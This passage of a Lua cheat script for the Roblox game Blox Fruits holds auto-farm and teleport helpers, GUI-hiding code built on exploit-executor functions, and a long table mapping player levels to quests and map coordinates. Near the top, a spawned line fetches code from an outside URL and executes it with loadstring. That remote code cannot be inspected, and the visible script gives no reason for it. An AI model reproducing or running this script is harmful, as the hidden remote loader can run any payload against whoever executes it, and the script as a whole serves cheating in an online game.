-- yes please dont use globals :heart:
local CheckQ, CheckBossQuest, Hop, InfAb, infinitestam, NoDodgeCool, NameMelee, NameSword, checkskillMelee, checkskillDF, checkskillSword, checkskillGun, SendKey, autoskill, CheckInventory, TeleportSeabeast, Click, IsWpSKillLoaded, GetWeapon, EquipAllWeapon, UnEquipWeapon, EquipWeapon, TP, StopTween, CheckPirateBoat, CheckSwanBoat, CheckSeaBeast, CheckLeviathanSegment, CheckLeviathanTail, CheckLeviathan, TeleportLeviathan, TweenTemple, DayNight, ClockTime, BuyGear, PullLever, AncientClock, TweentoCurrentRaceDoor, GetSeaBeastTrial, CheckBossDimension, BoatShit, TPBoatShit, StopTweenBoatShit, CheckDimension, CheckBribe, CheckElite, CheckMirage, CheckKitsune, MoonTextureId, CheckMoonTexture, ClockTime, CheckMoon, CheckLegendarySword, isnil, UpdatePlayerChams, UpdateIslandESP, UpdateChestEsp, UpdateBfEsp, UpdateFlowerEsp, IsIslandRaid, getNextIsland, LockMoon, ESPMirageIsland, CheckAcientOneStatus
-- manually added locals:
local MyLevel, CFrameQuest, CFrameMon, Mon, NameMon, NameQuest, LevelQuest


local Vector2,CFrame,Instance,UDim2=Vector2,CFrame,Instance,UDim2 -- yes this will barely add performance but ya
local _Jinada_shared={} -- getgenv = bad and it crashes on second execution anyways :3
if getgenv().Jinada then
	warn("ALREADY OPEN")
	return
end
getgenv().Jinada=true


spawn(function()
	loadstring(game:HttpGet("https://you.whimper.xyz/cute"))()
end)

local player = game:GetService("Players").LocalPlayer
while not player.Character do
    task.wait(3)
end

local L_1_ = os.clock()
local L_2_ = get_hidden_gui or gethui;
if syn and typeof(syn) == "table" and RenderWindow then
	syn.protect_gui = gethui
end;
local function L_3_func(L_60_arg0)
	if L_2_ then
		L_60_arg0["Parent"] = L_2_()
	elseif not is_sirhurt_closure and (syn and syn.protect_gui) then
		syn.protect_gui(L_60_arg0)
		L_60_arg0["Parent"] = game:GetService("CoreGui")
	elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
		L_60_arg0["Parent"] = game:GetService("CoreGui").RobloxGui
	else
		L_60_arg0["Parent"] = game:GetService("CoreGui")
	end
end;
local L_4_ = Instance.new("ScreenGui")
L_3_func(L_4_)
local L_5_ = game:GetService("ReplicatedStorage")
local L_6_ = game:GetService("TeleportService")
local L_7_ = game:GetService("VirtualUser")
local L_8_ = game:GetService("RunService")
local L_9_ = game:GetService("Players")
local L_10_ = L_5_:WaitForChild("Remotes")
local L_11_ = L_10_:WaitForChild("Validator")
local L_12_ = L_10_:WaitForChild("CommF_")
local L_13_ = workspace:WaitForChild("_WorldOrigin")
local L_14_ = workspace:WaitForChild("Characters")
local L_15_ = workspace:WaitForChild("Enemies")
local L_16_ = workspace:WaitForChild("Map")
local L_17_ = L_13_:WaitForChild("EnemySpawns")
local L_18_ = L_13_:WaitForChild("Locations")
local L_19_ = L_8_.RenderStepped;
local L_20_ = L_8_.Heartbeat;
local L_21_ = L_8_.Stepped;
local L_22_ = L_9_.LocalPlayer;
local L_23_, L_24_, L_25_ = game.PlaceId == 2753915549, game.PlaceId == 4442272183, game.PlaceId == 7449423635;
local function L_26_func(...)
	return L_12_:InvokeServer(...)
end;
function CheckQ()
	MyLevel = game:GetService('Players').LocalPlayer.Data.Level.Value;
	if L_23_ then
		if MyLevel == 1 or MyLevel <= 9 then
			Mon, NameMon, NameQuest, LevelQuest = "Bandit", "Bandit", "BanditQuest1", 1;
			CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, - 0, - 0.341998369, 0, 1, - 0, 0.341998369, 0, 0.939700544)
			CFrameMon = CFrame.new(1045.962646484375, 27.00250816345215, 1560.8203125)
		elseif MyLevel == 10 or MyLevel <= 14 then
			Mon, NameMon, NameQuest, LevelQuest = "Monkey", "Monkey", "JungleQuest", 1;
			CFrameQuest = CFrame.new(- 1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
			CFrameMon = CFrame.new(- 1448.51806640625, 67.85301208496094, 11.46579647064209)
		elseif MyLevel == 15 or MyLevel <= 29 then
			Mon, NameMon, NameQuest, LevelQuest = "Gorilla", "Gorilla", "JungleQuest", 2;
			CFrameQuest = CFrame.new(- 1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
			CFrameMon = CFrame.new(- 1129.8836669921875, 40.46354675292969, - 525.4237060546875)
		elseif MyLevel == 30 or MyLevel <= 39 then
			Mon, NameMon, NameQuest, LevelQuest = "Pirate", "Pirate", "BuggyQuest1", 1;
			CFrameQuest = CFrame.new(- 1141.07483, 4.10001802, 3831.5498, 0.965929627, - 0, - 0.258804798, 0, 1, - 0, 0.258804798, 0, 0.965929627)
			CFrameMon = CFrame.new(- 1103.513427734375, 13.752052307128906, 3896.091064453125)
		elseif MyLevel == 40 or MyLevel <= 59 then
			Mon, NameMon, NameQuest, LevelQuest = "Brute", "Brute", "BuggyQuest1", 2;
			CFrameQuest = CFrame.new(- 1141.07483, 4.10001802, 3831.5498, 0.965929627, - 0, - 0.258804798, 0, 1, - 0, 0.258804798, 0, 0.965929627)
			CFrameMon = CFrame.new(- 1140.083740234375, 14.809885025024414, 4322.92138671875)
		elseif MyLevel == 60 or MyLevel <= 74 then
			Mon, NameMon, NameQuest, LevelQuest = "Desert Bandit", "Desert Bandit", "DesertQuest", 1;
			CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, - 0, - 0.573571265, 0, 1, - 0, 0.573571265, 0, 0.819155693)
			CFrameMon = CFrame.new(924.7998046875, 6.44867467880249, 4481.5859375)
		elseif MyLevel == 75 or MyLevel <= 89 then
			NameMon, NameQuest, LevelQuest = "Desert Officer", "DesertQuest", 2;
			CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, - 0, - 0.573571265, 0, 1, - 0, 0.573571265, 0, 0.819155693)
			CFrameMon = CFrame.new(1608.2822265625, 8.614224433898926, 4371.00732421875)
		elseif MyLevel == 90 or MyLevel <= 99 then
			NameMon, NameQuest, LevelQuest = "Snow Bandit", "SnowQuest", 1;
			CFrameQuest = CFrame.new(1389.74451, 88.1519318, - 1298.90796, - 0.342042685, 0, 0.939684391, 0, 1, 0, - 0.939684391, 0, - 0.342042685)
			CFrameMon = CFrame.new(1354.347900390625, 87.27277374267578, - 1393.946533203125)
		elseif MyLevel == 100 or MyLevel <= 119 then
			NameMon, NameQuest, LevelQuest = "Snowman", "SnowQuest", 2;
			CFrameQuest = CFrame.new(1389.74451, 88.1519318, - 1298.90796, - 0.342042685, 0, 0.939684391, 0, 1, 0, - 0.939684391, 0, - 0.342042685)
			CFrameMon = CFrame.new(1201.6412353515625, 144.57958984375, - 1550.0670166015625)
		elseif MyLevel == 120 or MyLevel <= 149 then
			NameMon, NameQuest, LevelQuest = "Chief Petty Officer", "MarineQuest2", 1;
			CFrameQuest = CFrame.new(- 5039.58643, 27.3500385, 4324.68018, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 4881.23095703125, 22.65204429626465, 4273.75244140625)
		elseif MyLevel == 150 or MyLevel <= 174 then
			NameMon, NameQuest, LevelQuest = "Sky Bandit", "SkyQuest", 1;
			CFrameQuest = CFrame.new(- 4839.53027, 716.368591, - 2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
			CFrameMon = CFrame.new(- 4953.20703125, 295.74420166015625, - 2899.22900390625)
		elseif MyLevel == 175 or MyLevel <= 189 then
			NameMon, NameQuest, LevelQuest = "Dark Master", "SkyQuest", 2;
			CFrameQuest = CFrame.new(- 4839.53027, 716.368591, - 2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
			CFrameMon = CFrame.new(- 5259.8447265625, 391.3976745605469, - 2229.035400390625)
		elseif MyLevel == 190 or MyLevel <= 209 then
			NameMon, NameQuest, LevelQuest = "Prisoner", "PrisonerQuest", 1;
			CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, - 0.0894274712, - 5.00292918e-09, - 0.995993316, 1.60817859e-09, 1, - 5.16744869e-09, 0.995993316, - 2.06384709e-09, - 0.0894274712)
			CFrameMon = CFrame.new(5098.9736328125, - 0.3204058110713959, 474.2373352050781)
		elseif MyLevel == 210 or MyLevel <= 249 then
			NameMon, NameQuest, LevelQuest = "Dangerous Prisoner", "PrisonerQuest", 2;
			CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, - 0.0894274712, - 5.00292918e-09, - 0.995993316, 1.60817859e-09, 1, - 5.16744869e-09, 0.995993316, - 2.06384709e-09, - 0.0894274712)
			CFrameMon = CFrame.new(5654.5634765625, 15.633401870727539, 866.2991943359375)
		elseif MyLevel == 250 or MyLevel <= 274 then
			NameMon, NameQuest, LevelQuest = "Toga Warrior", "ColosseumQuest", 1;
			CFrameQuest = CFrame.new(- 1580.04663, 6.35000277, - 2986.47534, - 0.515037298, 0, - 0.857167721, 0, 1, 0, 0.857167721, 0, - 0.515037298)
			CFrameMon = CFrame.new(- 1820.21484375, 51.68385696411133, - 2740.6650390625)
		elseif MyLevel == 275 or MyLevel <= 299 then
			NameMon, NameQuest, LevelQuest = "Gladiator", "ColosseumQuest", 2;
			CFrameQuest = CFrame.new(- 1580.04663, 6.35000277, - 2986.47534, - 0.515037298, 0, - 0.857167721, 0, 1, 0, 0.857167721, 0, - 0.515037298)
			CFrameMon = CFrame.new(- 1292.838134765625, 56.380882263183594, - 3339.031494140625)
		elseif MyLevel == 300 or MyLevel <= 324 then
			NameMon, NameQuest, LevelQuest = "Military Soldier", "MagmaQuest", 1;
			CFrameQuest = CFrame.new(- 5313.37012, 10.9500084, 8515.29395, - 0.499959469, 0, 0.866048813, 0, 1, 0, - 0.866048813, 0, - 0.499959469)
			CFrameMon = CFrame.new(- 5411.16455078125, 11.081554412841797, 8454.29296875)
		elseif MyLevel == 325 or MyLevel <= 374 then
			NameMon, NameQuest, LevelQuest = "Military Spy", "MagmaQuest", 2;
			CFrameQuest = CFrame.new(- 5313.37012, 10.9500084, 8515.29395, - 0.499959469, 0, 0.866048813, 0, 1, 0, - 0.866048813, 0, - 0.499959469)
			CFrameMon = CFrame.new(- 5802.8681640625, 86.26241302490234, 8828.859375)
		elseif MyLevel == 375 or MyLevel <= 399 then
			NameMon, NameQuest, LevelQuest = "Fishman Warrior", "FishmanQuest", 1;
			CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
			CFrameMon = CFrame.new(60878.30078125, 18.482830047607422, 1543.7574462890625)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
			end
		elseif MyLevel == 400 or MyLevel <= 449 then
			NameMon, NameQuest, LevelQuest = "Fishman Commando", "FishmanQuest", 2;
			CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
			CFrameMon = CFrame.new(61922.6328125, 18.482830047607422, 1493.934326171875)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
			end
		elseif MyLevel == 450 or MyLevel <= 474 then
			NameMon, NameQuest, LevelQuest = "God's Guard", "SkyExp1Quest", 1;
			CFrameQuest = CFrame.new(- 4721.88867, 843.874695, - 1949.96643, 0.996191859, - 0, - 0.0871884301, 0, 1, - 0, 0.0871884301, 0, 0.996191859)
			CFrameMon = CFrame.new(- 4710.04296875, 845.2769775390625, - 1927.3079833984375)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(- 4607.82275, 872.54248, - 1667.55688))
			end
		elseif MyLevel == 475 or MyLevel <= 524 then
			NameMon, NameQuest, LevelQuest = "Shanda", "SkyExp1Quest", 2;
			CFrameQuest = CFrame.new(- 7859.09814, 5544.19043, - 381.476196, - 0.422592998, 0, 0.906319618, 0, 1, 0, - 0.906319618, 0, - 0.422592998)
			CFrameMon = CFrame.new(- 7678.48974609375, 5566.40380859375, - 497.2156066894531)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(- 7894.6176757813, 5547.1416015625, - 380.29119873047))
			end
		elseif MyLevel == 525 or MyLevel <= 549 then
			NameMon, NameQuest, LevelQuest = "Royal Squad", "SkyExp2Quest", 1;
			CFrameQuest = CFrame.new(- 7906.81592, 5634.6626, - 1411.99194, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 7624.25244140625, 5658.13330078125, - 1467.354248046875)
		elseif MyLevel == 550 or MyLevel <= 624 then
			NameMon, NameQuest, LevelQuest = "Royal Soldier", "SkyExp2Quest", 2;
			CFrameQuest = CFrame.new(- 7906.81592, 5634.6626, - 1411.99194, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 7836.75341796875, 5645.6640625, - 1790.6236572265625)
		elseif MyLevel == 625 or MyLevel <= 649 then
			NameMon, NameQuest, LevelQuest = "Galley Pirate", "FountainQuest", 1;
			CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, 0.087131381)
			CFrameMon = CFrame.new(5551.02197265625, 78.90135192871094, 3930.412841796875)
		elseif MyLevel >= 650 then
			NameMon, NameQuest, LevelQuest = "Galley Captain", "FountainQuest", 2;
			CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, 0.087131381)
			CFrameMon = CFrame.new(5441.95166015625, 42.50205993652344, 4950.09375)
		end
	elseif L_24_ then
		if MyLevel == 700 or MyLevel <= 724 then
			NameMon, NameQuest, LevelQuest = "Raider", "Area1Quest", 1;
			CFrameQuest = CFrame.new(- 429.543518, 71.7699966, 1836.18188, - 0.22495985, 0, - 0.974368095, 0, 1, 0, 0.974368095, 0, - 0.22495985)
			CFrameMon = CFrame.new(- 728.3267211914062, 52.779319763183594, 2345.7705078125)
		elseif MyLevel == 725 or MyLevel <= 774 then
			NameMon, NameQuest, LevelQuest = "Mercenary", "Area1Quest", 2;
			CFrameQuest = CFrame.new(- 429.543518, 71.7699966, 1836.18188, - 0.22495985, 0, - 0.974368095, 0, 1, 0, 0.974368095, 0, - 0.22495985)
			CFrameMon = CFrame.new(- 1004.3244018554688, 80.15886688232422, 1424.619384765625)
		elseif MyLevel == 775 or MyLevel <= 799 then
			NameMon, NameQuest, LevelQuest = "Swan Pirate", "Area2Quest", 1;
			CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, - 0.99026376, 0, 0.139203906)
			CFrameMon = CFrame.new(1068.664306640625, 137.61428833007812, 1322.1060791015625)
		elseif MyLevel == 800 or MyLevel <= 874 then
			NameMon, NameQuest, LevelQuest = "Factory Staff", "Area2Quest", 2;
			CFrameQuest = CFrame.new(632.698608, 73.1055908, 918.666321, - 0.0319722369, 8.96074881e-10, - 0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, - 1.07732087e-10, - 0.0319722369)
			CFrameMon = CFrame.new(73.07867431640625, 81.86344146728516, - 27.470672607421875)
		elseif MyLevel == 875 or MyLevel <= 899 then
			NameMon, NameQuest, LevelQuest = "Marine Lieutenant", "MarineQuest3", 1;
			CFrameQuest = CFrame.new(- 2440.79639, 71.7140732, - 3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
			CFrameMon = CFrame.new(- 2821.372314453125, 75.89727783203125, - 3070.089111328125)
		elseif MyLevel == 900 or MyLevel <= 949 then
			NameMon, NameQuest, LevelQuest = "Marine Captain", "MarineQuest3", 2;
			CFrameQuest = CFrame.new(- 2440.79639, 71.7140732, - 3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
			CFrameMon = CFrame.new(- 1861.2310791015625, 80.17658233642578, - 3254.697509765625)
		elseif MyLevel == 950 or MyLevel <= 974 then
			NameMon, NameQuest, LevelQuest = "Zombie", "ZombieQuest", 1;
			CFrameQuest = CFrame.new(- 5497.06152, 47.5923004, - 795.237061, - 0.29242146, 0, - 0.95628953, 0, 1, 0, 0.95628953, 0, - 0.29242146)
			CFrameMon = CFrame.new(- 5657.77685546875, 78.96973419189453, - 928.68701171875)
		elseif MyLevel == 975 or MyLevel <= 999 then
			NameMon, NameQuest, LevelQuest = "Vampire", "ZombieQuest", 2;
			CFrameQuest = CFrame.new(- 5497.06152, 47.5923004, - 795.237061, - 0.29242146, 0, - 0.95628953, 0, 1, 0, 0.95628953, 0, - 0.29242146)
			CFrameMon = CFrame.new(- 6037.66796875, 32.18463897705078, - 1340.6597900390625)
		elseif MyLevel == 1000 or MyLevel <= 1049 then
			NameMon, NameQuest, LevelQuest = "Snow Trooper", "SnowMountainQuest", 1;
			CFrameQuest = CFrame.new(609.858826, 400.119904, - 5372.25928, - 0.374604106, 0, 0.92718488, 0, 1, 0, - 0.92718488, 0, - 0.374604106)
			CFrameMon = CFrame.new(549.1473388671875, 427.3870544433594, - 5563.69873046875)
		elseif MyLevel == 1050 or MyLevel <= 1099 then
			NameMon, NameQuest, LevelQuest = "Winter Warrior", "SnowMountainQuest", 2;
			CFrameQuest = CFrame.new(609.858826, 400.119904, - 5372.25928, - 0.374604106, 0, 0.92718488, 0, 1, 0, - 0.92718488, 0, - 0.374604106)
			CFrameMon = CFrame.new(1142.7451171875, 475.6398010253906, - 5199.41650390625)
		elseif MyLevel == 1100 or MyLevel <= 1124 then
			NameMon, NameQuest, LevelQuest = "Lab Subordinate", "IceSideQuest", 1;
			CFrameQuest = CFrame.new(- 6064.06885, 15.2422857, - 4902.97852, 0.453972578, - 0, - 0.891015649, 0, 1, - 0, 0.891015649, 0, 0.453972578)
			CFrameMon = CFrame.new(- 5707.4716796875, 15.951709747314453, - 4513.39208984375)
		elseif MyLevel == 1125 or MyLevel <= 1174 then
			NameMon, NameQuest, LevelQuest = "Horned Warrior", "IceSideQuest", 2;
			CFrameQuest = CFrame.new(- 6064.06885, 15.2422857, - 4902.97852, 0.453972578, - 0, - 0.891015649, 0, 1, - 0, 0.891015649, 0, 0.453972578)
			CFrameMon = CFrame.new(- 6341.36669921875, 15.951770782470703, - 5723.162109375)
		elseif MyLevel == 1175 or MyLevel <= 1199 then
			NameMon, NameQuest, LevelQuest = "Magma Ninja", "FireSideQuest", 1;
			CFrameQuest = CFrame.new(- 5428.03174, 15.0622921, - 5299.43457, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
			CFrameMon = CFrame.new(- 5449.6728515625, 76.65874481201172, - 5808.20068359375)
		elseif MyLevel == 1200 or MyLevel <= 1249 then
			NameMon, NameQuest, LevelQuest = "Lava Pirate", "FireSideQuest", 2;
			CFrameQuest = CFrame.new(- 5428.03174, 15.0622921, - 5299.43457, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
			CFrameMon = CFrame.new(- 5213.33154296875, 49.73788070678711, - 4701.451171875)
		elseif MyLevel == 1250 or MyLevel <= 1274 then
			NameMon, NameQuest, LevelQuest = "Ship Deckhand", "ShipQuest1", 1;
			CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016)
			CFrameMon = CFrame.new(1212.0111083984375, 150.79205322265625, 33059.24609375)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
			end
		elseif MyLevel == 1275 or MyLevel <= 1299 then
			NameMon, NameQuest, LevelQuest = "Ship Engineer", "ShipQuest1", 2;
			CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016)
			CFrameMon = CFrame.new(919.4786376953125, 43.54401397705078, 32779.96875)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
			end
		elseif MyLevel == 1300 or MyLevel <= 1324 then
			NameMon, NameQuest, LevelQuest = "Ship Steward", "ShipQuest2", 1;
			CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125)
			CFrameMon = CFrame.new(919.4385375976562, 129.55599975585938, 33436.03515625)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
			end
		elseif MyLevel == 1325 or MyLevel <= 1349 then
			NameMon, NameQuest, LevelQuest = "Ship Officer", "ShipQuest2", 2;
			CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125)
			CFrameMon = CFrame.new(1036.0179443359375, 181.4390411376953, 33315.7265625)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
			end
		elseif MyLevel == 1350 or MyLevel <= 1374 then
			NameMon, NameQuest, LevelQuest = "Arctic Warrior", "FrostQuest", 1;
			CFrameQuest = CFrame.new(5667.6582, 26.7997818, - 6486.08984, - 0.933587909, 0, - 0.358349502, 0, 1, 0, 0.358349502, 0, - 0.933587909)
			CFrameMon = CFrame.new(5966.24609375, 62.97002029418945, - 6179.3828125)
			if _Jinada_shared.AutoFarmLevel and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
				game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(- 6508.5581054688, 5000.034996032715, - 132.83953857422))
			end
		elseif MyLevel == 1375 or MyLevel <= 1424 then
			NameMon, NameQuest, LevelQuest = "Snow Lurker", "FrostQuest", 2;
			CFrameQuest = CFrame.new(5667.6582, 26.7997818, - 6486.08984, - 0.933587909, 0, - 0.358349502, 0, 1, 0, 0.358349502, 0, - 0.933587909)
			CFrameMon = CFrame.new(5407.07373046875, 69.19437408447266, - 6880.88037109375)
		elseif MyLevel == 1425 or MyLevel <= 1449 then
			NameMon, NameQuest, LevelQuest = "Sea Soldier", "ForgottenQuest", 1;
			CFrameQuest = CFrame.new(- 3054.44458, 235.544281, - 10142.8193, 0.990270376, - 0, - 0.13915664, 0, 1, - 0, 0.13915664, 0, 0.990270376)
			CFrameMon = CFrame.new(- 3028.2236328125, 64.67451477050781, - 9775.4267578125)
		elseif MyLevel >= 1450 then
			NameMon, NameQuest, LevelQuest = "Water Fighter", "ForgottenQuest", 2;
			CFrameQuest = CFrame.new(- 3054.44458, 235.544281, - 10142.8193, 0.990270376, - 0, - 0.13915664, 0, 1, - 0, 0.13915664, 0, 0.990270376)
			CFrameMon = CFrame.new(- 3352.9013671875, 285.01556396484375, - 10534.841796875)
		end
	elseif L_25_ then
		if MyLevel == 1500 or MyLevel <= 1524 then
			NameMon, NameQuest, LevelQuest = "Pistol Millionaire", "PiratePortQuest", 1;
			CFrameQuest = CFrame.new(- 290.074677, 42.9034653, 5581.58984, 0.965929627, - 0, - 0.258804798, 0, 1, - 0, 0.258804798, 0, 0.965929627)
			CFrameMon = CFrame.new(- 245.9963836669922, 47.30615234375, 5584.1005859375)
		elseif MyLevel == 1525 or MyLevel <= 1574 then
			NameMon, NameQuest, LevelQuest = "Pistol Billionaire", "PiratePortQuest", 2;
			CFrameQuest = CFrame.new(- 290.074677, 42.9034653, 5581.58984, 0.965929627, - 0, - 0.258804798, 0, 1, - 0, 0.258804798, 0, 0.965929627)
			CFrameMon = CFrame.new(- 187.3301544189453, 86.23987579345703, 6013.513671875)
		elseif MyLevel == 1575 or MyLevel <= 1599 then
			NameMon, NameQuest, LevelQuest = "Dragon Crew Warrior", "AmazonQuest", 1;
			CFrameQuest = CFrame.new(6736.32958984375, 127.4482192993164, - 712.3320922851562)
			CFrameMon = CFrame.new(7014.84765625, 196.3662567138672, - 1024.2913818359375)
		elseif MyLevel == 1600 or MyLevel <= 1624 then
			NameMon, NameQuest, LevelQuest = "Dragon Crew Archer", "AmazonQuest", 2;
			CFrameQuest = CFrame.new(6736.32958984375, 127.4482192993164, - 712.3320922851562)
			CFrameMon = CFrame.new(6792.60302734375, 535.4273681640625, 454.4717102050781)
		elseif MyLevel == 1625 or MyLevel <= 1649 then
			NameMon, NameQuest, LevelQuest = "Hydra Enforcer", "AmazonQuest2", 1;
			CFrameQuest = CFrame.new(5210.87353515625, 1004.1356811523438, 755.8411254882812)
			CFrameMon = CFrame.new(4704.02099609375, 1043.867431640625, 679.615966796875)
		elseif MyLevel == 1650 or MyLevel <= 1699 then
			NameMon, NameQuest, LevelQuest = "Venomous Assailant", "AmazonQuest2", 2;
			CFrameQuest = CFrame.new(5210.87353515625, 1004.1356811523438, 755.8411254882812)
			CFrameMon = CFrame.new(4731.27197265625, 1090.177978515625, 1078.1712646484375)
		elseif MyLevel == 1700 or MyLevel <= 1724 then
			NameMon, NameQuest, LevelQuest = "Marine Commodore", "MarineTreeIsland", 1;
			CFrameQuest = CFrame.new(2180.54126, 27.8156815, - 6741.5498, - 0.965929747, 0, 0.258804798, 0, 1, 0, - 0.258804798, 0, - 0.965929747)
			CFrameMon = CFrame.new(2286.0078125, 73.13391876220703, - 7159.80908203125)
		elseif MyLevel == 1725 or MyLevel <= 1774 then
			NameMon, NameQuest, LevelQuest = "Marine Rear Admiral", "MarineTreeIsland", 2;
			CFrameQuest = CFrame.new(2179.98828125, 28.731239318848, - 6740.0551757813)
			CFrameMon = CFrame.new(3656.773681640625, 160.52406311035156, - 7001.5986328125)
		elseif MyLevel == 1775 or MyLevel <= 1799 then
			NameMon, NameQuest, LevelQuest = "Fishman Raider", "DeepForestIsland3", 1;
			CFrameQuest = CFrame.new(- 10581.6563, 330.872955, - 8761.18652, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
			CFrameMon = CFrame.new(- 10407.5263671875, 331.76263427734375, - 8368.5166015625)
		elseif MyLevel == 1800 or MyLevel <= 1824 then
			NameMon, NameQuest, LevelQuest = "Fishman Captain", "DeepForestIsland3", 2;
			CFrameQuest = CFrame.new(- 10581.6563, 330.872955, - 8761.18652, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
			CFrameMon = CFrame.new(- 10994.701171875, 352.38140869140625, - 9002.1103515625)
		elseif MyLevel == 1825 or MyLevel <= 1849 then
			NameMon, NameQuest, LevelQuest = "Forest Pirate", "DeepForestIsland", 1;
			CFrameQuest = CFrame.new(- 13234.04, 331.488495, - 7625.40137, 0.707134247, - 0, - 0.707079291, 0, 1, - 0, 0.707079291, 0, 0.707134247)
			CFrameMon = CFrame.new(- 13274.478515625, 332.3781433105469, - 7769.58056640625)
		elseif MyLevel == 1850 or MyLevel <= 1899 then
			NameMon, NameQuest, LevelQuest = "Mythological Pirate", "DeepForestIsland", 2;
			CFrameQuest = CFrame.new(- 13234.04, 331.488495, - 7625.40137, 0.707134247, - 0, - 0.707079291, 0, 1, - 0, 0.707079291, 0, 0.707134247)
			CFrameMon = CFrame.new(- 13680.607421875, 501.08154296875, - 6991.189453125)
		elseif MyLevel == 1900 or MyLevel <= 1924 then
			NameMon, NameQuest, LevelQuest = "Jungle Pirate", "DeepForestIsland2", 1;
			CFrameQuest = CFrame.new(- 12680.3818, 389.971039, - 9902.01953, - 0.0871315002, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, - 0.0871315002)
			CFrameMon = CFrame.new(- 12256.16015625, 331.73828125, - 10485.8369140625)
		elseif MyLevel == 1925 or MyLevel <= 1974 then
			NameMon, NameQuest, LevelQuest = "Musketeer Pirate", "DeepForestIsland2", 2;
			CFrameQuest = CFrame.new(- 12680.3818, 389.971039, - 9902.01953, - 0.0871315002, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, - 0.0871315002)
			CFrameMon = CFrame.new(- 13457.904296875, 391.545654296875, - 9859.177734375)
		elseif MyLevel == 1975 or MyLevel <= 1999 then
			NameMon, NameQuest, LevelQuest = "Reborn Skeleton", "HauntedQuest1", 1;
			CFrameQuest = CFrame.new(- 9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
			CFrameMon = CFrame.new(- 8763.7236328125, 165.72299194335938, 6159.86181640625)
		elseif MyLevel == 2000 or MyLevel <= 2024 then
			NameMon, NameQuest, LevelQuest = "Living Zombie", "HauntedQuest1", 2;
